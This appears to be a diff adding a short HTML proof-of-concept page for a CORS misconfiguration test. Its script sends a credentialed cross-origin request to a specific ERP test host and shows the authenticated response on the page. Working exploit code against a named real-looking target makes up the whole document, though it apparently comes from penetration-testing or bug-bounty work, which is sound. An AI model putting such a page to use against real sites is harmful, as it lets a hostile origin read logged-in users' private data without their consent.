@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS PoC</title>
+</head>
+
+<body>
+
+<h2>CORS Test</h2>
+<pre id="output">Waiting...</pre>
+
+<script>
+
+fetch("https://uat-erp.pwhr.in/", {
+    method: "GET",
+    credentials: "include"
+})
+.then(response => {
+    return response.text();
+})
+.then(data => {
+    document.getElementById("output").innerText = data;
+})
+.catch(error => {
+    document.getElementById("output").innerText =
+        "CORS blocked: " + error;
+});
+
+</script>
+
+</body>
+</html>
